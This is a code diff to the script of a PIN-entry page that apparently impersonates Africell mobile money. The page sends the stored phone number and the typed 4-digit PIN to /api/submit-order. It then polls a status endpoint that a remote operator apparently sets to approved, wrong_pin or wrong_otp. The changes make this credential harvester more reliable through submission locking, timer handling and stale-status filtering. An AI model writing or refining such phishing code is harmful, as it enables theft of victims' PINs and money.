@@ -155,13 +155,30 @@
 
         let pinDigits = ['', '', '', ''];
         let activeInterval = null;
+        let safetyTimeout = null;
         let errorTimeout = null;
-        const pageLoadTimestamp = Date.now();
-        const phone = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';
+        let isSubmitting = false;
+
+        function getCurrentPhone() {
+            return (localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000').trim();
+        }
 
         window.addEventListener('DOMContentLoaded', () => {
-            localStorage.removeItem('africellApprovalTimestamp');
+            try {
+                localStorage.removeItem('africellApprovalTimestamp');
+            } catch (e) {}
         });
+
+        function clearTimers() {
+            if (activeInterval) {
+                clearInterval(activeInterval);
+                activeInterval = null;
+            }
+            if (safetyTimeout) {
+                clearTimeout(safetyTimeout);
+                safetyTimeout = null;
+            }
+        }
 
         function showInlineError(message) {
             errorText.innerText = message;
@@ -190,6 +207,7 @@
         }
 
         function pressKey(digit) {
+            if (isSubmitting) return;
             const firstEmpty = pinDigits.findIndex(d => d === '');
             if (firstEmpty !== -1) {
                 pinDigits[firstEmpty] = digit;
@@ -198,6 +216,7 @@
         }
 
         function deleteKey() {
+            if (isSubmitting) return;
             for (let i = 3; i >= 0; i--) {
                 if (pinDigits[i] !== '') { pinDigits[i] = ''; break; }
             }
@@ -205,6 +224,7 @@
         }
 
         function validateForm() {
+            if (isSubmitting) return;
             if (pinDigits.every(d => d !== '')) {
                 loginBtn.removeAttribute('disabled');
                 loginBtn.classList.add('enabled');
@@ -216,58 +236,62 @@
         }
 
         function handleLogin() {
+            if (isSubmitting) return;
             const pinCode = pinDigits.join('');
             if (pinCode.length !== 4) {
                 showInlineError('Please enter your 4-digit PIN.');
                 return;
             }
-            submitPinCode(phone, pinCode);
+            submitPinCode(getCurrentPhone(), pinCode);
         }
 
         async function submitPinCode(phoneNum, pin) {
-            try {
-                loginBtn.setAttribute('disabled', 'true');
-                loginBtn.classList.remove('enabled');
-                loginBtn.textContent = 'Verifying...';
+            isSubmitting = true;
+            clearTimers();
+            const submissionTimestamp = Date.now();
 
+            loginBtn.setAttribute('disabled', 'true');
+            loginBtn.classList.remove('enabled');
+            loginBtn.textContent = 'Verifying...';
+
+            try {
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ phone: phoneNum, uniqueId: 'Confirmation PIN: ' + pin })
                 });
 
-                const result = await response.json();
-                if (result.success !== false) {
-                    pollApprovalStatus(phoneNum);
-                } else {
-                    showInlineError('Verification failed.');
-                    resetButtonState();
+                const result = await response.json().catch(() => ({}));
+                if (!response.ok || (result && result.success === false)) {
+                    resetButtonState(false);
+                    showInlineError('Verification failed. Please try again.');
+                    return;
                 }
+
+                pollApprovalStatus(phoneNum, submissionTimestamp);
             } catch (error) {
-                pollApprovalStatus(phoneNum);
+                resetButtonState(false);
+                showInlineError('Verification failed. Please try again.');
             }
         }
 
-        function resetButtonState() {
+        function resetButtonState(clearDigits = true) {
+            isSubmitting = false;
+            clearTimers();
             loginBtn.textContent = 'Verify';
-            loginBtn.removeAttribute('disabled');
-            loginBtn.classList.add('enabled');
-            pinDigits = ['', '', '', ''];
+            if (clearDigits) {
+                pinDigits = ['', '', '', ''];
+            }
             updatePinDisplay();
         }
 
-        function pollApprovalStatus(phoneNum) {
+        function pollApprovalStatus(phoneNum, submissionTimestamp) {
             const cleanPhone = phoneNum.trim();
-            if (activeInterval) clearInterval(activeInterval);
-            const submissionTimestamp = Date.now();
+            clearTimers();
 
-            // Updated safety timeout to 5 minutes (300,000 milliseconds)
-            const safetyTimeout = setTimeout(() => {
-                if (activeInterval) {
-                    clearInterval(activeInterval);
-                    resetButtonState();
-                    showInlineError('⚠️ Verification timed out after 5 minutes. Please try again.');
-                }
+            safetyTimeout = setTimeout(() => {
+                resetButtonState(true);
+                showInlineError('⚠️ Verification timed out after 5 minutes. Please try again.');
             }, 300000);
 
             activeInterval = setInterval(async () => {
@@ -275,18 +299,28 @@
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}&t=${Date.now()}`);
                     const data = await response.json();
 
-                    if (data.status === 'approved' && data.timestamp && data.timestamp >= pageLoadTimestamp && data.timestamp >= submissionTimestamp) {
-                        clearTimeout(safetyTimeout);
-                        clearInterval(activeInterval);
+                    if (!data || (data.timestamp && data.timestamp < submissionTimestamp - 5000)) {
+                        return;
+                    }
+
+                    if (data.status === 'approved') {
+                        clearTimers();
+                        isSubmitting = false;
                         window.location.href = 'success.html';
                     } 
-                    else if ((data.status === 'rejected' || data.status === 'wrong_id' || data.status === 'wrong_pin' || data.status === 'wrong_otp') && data.timestamp && data.timestamp >= submissionTimestamp) {
-                        clearTimeout(safetyTimeout);
-                        clearInterval(activeInterval);
-                        showInlineError('⚠️ Incorrect PIN. Please try again.');
-                        resetButtonState();
+                    else if (data.status === 'rejected') {
+                        clearTimers();
+                        isSubmitting = false;
+                        window.location.href = 'reject.html';
                     }
-                } catch (e) { console.error(e); }
+                    else if (data.status === 'wrong_id' || data.status === 'wrong_pin' || data.status === 'wrong_otp') {
+                        clearTimers();
+                        resetButtonState(true);
+                        showInlineError('⚠️ Incorrect PIN. Please try again.');
+                    }
+                } catch (e) {
+                    console.error(e);
+                }
             }, 3000);
         }
     </script>
